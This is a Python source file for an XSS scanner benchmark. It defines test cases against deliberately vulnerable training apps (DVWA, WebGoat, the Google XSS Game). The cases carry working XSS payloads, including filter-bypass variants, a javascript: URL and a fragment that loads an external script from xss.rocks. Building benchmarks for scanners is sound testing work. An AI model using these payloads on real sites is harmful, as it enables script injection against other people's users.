#!/usr/bin/env python3

"""
Project: BRS-XSS Benchmark Suite
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Wed 25 Dec 2025 13:00:00 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Benchmark target definitions for DVWA, WebGoat, XSS-Game.
"""

from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from abc import ABC, abstractmethod


@dataclass
class TestCase:
    """Single test case for benchmarking"""

    test_id: str
    name: str
    url: str
    method: str = "GET"
    params: Dict[str, str] = field(default_factory=dict)
    expected_vulnerable: bool = True
    context_type: str = "html"
    difficulty: str = "low"  # low, medium, high
    description: str = ""


class BenchmarkTarget(ABC):
    """Base class for benchmark targets"""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.test_cases: List[TestCase] = []
        self._init_test_cases()

    @abstractmethod
    def _init_test_cases(self):
        """Initialize test cases for this target"""
        pass

    @property
    @abstractmethod
    def target_type(self) -> str:
        """Return target type identifier"""
        pass

    @property
    @abstractmethod
    def target_name(self) -> str:
        """Return human-readable target name"""
        pass

    def get_test_cases(self, difficulty: Optional[str] = None) -> List[TestCase]:
        """Get test cases, optionally filtered by difficulty"""
        if difficulty:
            return [tc for tc in self.test_cases if tc.difficulty == difficulty]
        return self.test_cases


class DVWATarget(BenchmarkTarget):
    """DVWA (Damn Vulnerable Web Application) benchmark target"""

    @property
    def target_type(self) -> str:
        return "dvwa"

    @property
    def target_name(self) -> str:
        return "DVWA (Damn Vulnerable Web Application)"

    def _init_test_cases(self):
        self.test_cases = [
            # Reflected XSS - Low
            TestCase(
                test_id="dvwa_rxss_low_1",
                name="DVWA Reflected XSS (Low) - Basic",
                url=f"{self.base_url}/vulnerabilities/xss_r/",
                params={"name": "<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="low",
                description="Basic reflected XSS with no filtering",
            ),
            # Reflected XSS - Medium
            TestCase(
                test_id="dvwa_rxss_med_1",
                name="DVWA Reflected XSS (Medium) - Script tag filter",
                url=f"{self.base_url}/vulnerabilities/xss_r/",
                params={"name": "<ScRiPt>alert(1)</ScRiPt>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="medium",
                description="Reflected XSS with case-insensitive script tag filter",
            ),
            TestCase(
                test_id="dvwa_rxss_med_2",
                name="DVWA Reflected XSS (Medium) - Event handler",
                url=f"{self.base_url}/vulnerabilities/xss_r/",
                params={"name": "<img src=x onerror=alert(1)>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="medium",
                description="Reflected XSS using event handler",
            ),
            # Reflected XSS - High
            TestCase(
                test_id="dvwa_rxss_high_1",
                name="DVWA Reflected XSS (High) - Regex bypass",
                url=f"{self.base_url}/vulnerabilities/xss_r/",
                params={"name": "<svg/onload=alert(1)>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="high",
                description="Reflected XSS bypassing regex filter",
            ),
            # Stored XSS - Low
            TestCase(
                test_id="dvwa_sxss_low_1",
                name="DVWA Stored XSS (Low) - Basic",
                url=f"{self.base_url}/vulnerabilities/xss_s/",
                method="POST",
                params={
                    "txtName": "Test",
                    "mtxMessage": "<script>alert(1)</script>",
                    "btnSign": "Sign+Guestbook",
                },
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="low",
                description="Basic stored XSS in guestbook",
            ),
            # Stored XSS - Medium
            TestCase(
                test_id="dvwa_sxss_med_1",
                name="DVWA Stored XSS (Medium) - Name field",
                url=f"{self.base_url}/vulnerabilities/xss_s/",
                method="POST",
                params={
                    "txtName": "<script>alert(1)</script>",
                    "mtxMessage": "Test message",
                    "btnSign": "Sign+Guestbook",
                },
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="medium",
                description="Stored XSS in name field with message filtering",
            ),
            # DOM XSS - Low
            TestCase(
                test_id="dvwa_dxss_low_1",
                name="DVWA DOM XSS (Low) - Location hash",
                url=f"{self.base_url}/vulnerabilities/xss_d/",
                params={"default": "<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="javascript",
                difficulty="low",
                description="DOM XSS via URL parameter",
            ),
            # DOM XSS - Medium
            TestCase(
                test_id="dvwa_dxss_med_1",
                name="DVWA DOM XSS (Medium) - Encoded payload",
                url=f"{self.base_url}/vulnerabilities/xss_d/",
                params={"default": "</option></select><img src=x onerror=alert(1)>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="medium",
                description="DOM XSS breaking out of select element",
            ),
            # Non-vulnerable endpoints (for false positive testing)
            TestCase(
                test_id="dvwa_safe_1",
                name="DVWA Safe Page - Login",
                url=f"{self.base_url}/login.php",
                params={"username": "<script>alert(1)</script>", "password": "test"},
                expected_vulnerable=False,
                context_type="html_content",
                difficulty="low",
                description="Login page with proper sanitization",
            ),
        ]


class WebGoatTarget(BenchmarkTarget):
    """WebGoat benchmark target"""

    @property
    def target_type(self) -> str:
        return "webgoat"

    @property
    def target_name(self) -> str:
        return "WebGoat"

    def _init_test_cases(self):
        self.test_cases = [
            # Reflected XSS
            TestCase(
                test_id="wg_rxss_1",
                name="WebGoat Reflected XSS - Credit Card",
                url=f"{self.base_url}/WebGoat/CrossSiteScripting/attack5a",
                method="POST",
                params={"field1": "<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="low",
                description="Reflected XSS in credit card field",
            ),
            # DOM XSS
            TestCase(
                test_id="wg_dxss_1",
                name="WebGoat DOM XSS - Route",
                url=f"{self.base_url}/WebGoat/CrossSiteScripting/attack6a",
                params={"route": "test<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="javascript",
                difficulty="medium",
                description="DOM XSS via route parameter",
            ),
            # Stored XSS
            TestCase(
                test_id="wg_sxss_1",
                name="WebGoat Stored XSS - Comments",
                url=f"{self.base_url}/WebGoat/CrossSiteScripting/attack7",
                method="POST",
                params={"comment": "<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="low",
                description="Stored XSS in comments",
            ),
            # Content Security Policy bypass
            TestCase(
                test_id="wg_csp_1",
                name="WebGoat CSP Bypass",
                url=f"{self.base_url}/WebGoat/CrossSiteScripting/attack8",
                params={"input": "<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="high",
                description="XSS with CSP bypass required",
            ),
        ]


class XSSGameTarget(BenchmarkTarget):
    """Google XSS Game benchmark target"""

    @property
    def target_type(self) -> str:
        return "xss-game"

    @property
    def target_name(self) -> str:
        return "Google XSS Game"

    def _init_test_cases(self):
        self.test_cases = [
            # Level 1 - Hello, world of XSS
            TestCase(
                test_id="xssgame_1",
                name="XSS Game Level 1 - Basic Injection",
                url=f"{self.base_url}/level1/frame",
                params={"query": "<script>alert(1)</script>"},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="low",
                description="Basic reflected XSS",
            ),
            # Level 2 - Persistence is key
            TestCase(
                test_id="xssgame_2",
                name="XSS Game Level 2 - Stored XSS",
                url=f"{self.base_url}/level2/frame",
                method="POST",
                params={"message": '<img src=x onerror="alert(1)">'},
                expected_vulnerable=True,
                context_type="html_content",
                difficulty="low",
                description="Stored XSS in chat",
            ),
            # Level 3 - That sinking feeling
            TestCase(
                test_id="xssgame_3",
                name="XSS Game Level 3 - DOM Injection",
                url=f"{self.base_url}/level3/frame#1' onerror='alert(1)'",
                expected_vulnerable=True,
                context_type="html_attribute",
                difficulty="medium",
                description="DOM XSS via fragment",
            ),
            # Level 4 - Context matters
            TestCase(
                test_id="xssgame_4",
                name="XSS Game Level 4 - Timer Injection",
                url=f"{self.base_url}/level4/frame",
                params={"timer": "1');alert('1"},
                expected_vulnerable=True,
                context_type="javascript",
                difficulty="medium",
                description="XSS in JavaScript context",
            ),
            # Level 5 - Breaking protocol
            TestCase(
                test_id="xssgame_5",
                name="XSS Game Level 5 - Protocol Handler",
                url=f"{self.base_url}/level5/frame/signup",
                params={"next": "javascript:alert(1)"},
                expected_vulnerable=True,
                context_type="url_parameter",
                difficulty="medium",
                description="XSS via javascript: protocol",
            ),
            # Level 6 - Follow the rabbit
            TestCase(
                test_id="xssgame_6",
                name="XSS Game Level 6 - External Script",
                url=f"{self.base_url}/level6/frame#//xss.rocks/xss.js",
                expected_vulnerable=True,
                context_type="javascript",
                difficulty="high",
                description="XSS via external script inclusion",
            ),
        ]


class CustomTarget(BenchmarkTarget):
    """Custom benchmark target with user-defined test cases"""

    def __init__(self, base_url: str, name: str = "Custom Target"):
        self._name = name
        super().__init__(base_url)

    @property
    def target_type(self) -> str:
        return "custom"

    @property
    def target_name(self) -> str:
        return self._name

    def _init_test_cases(self):
        # Custom targets start empty
        self.test_cases = []

    def add_test_case(self, test_case: TestCase):
        """Add a custom test case"""
        self.test_cases.append(test_case)

    def add_test_cases_from_config(self, config: List[Dict[str, Any]]):
        """Add test cases from configuration list"""
        for tc_config in config:
            self.test_cases.append(TestCase(**tc_config))
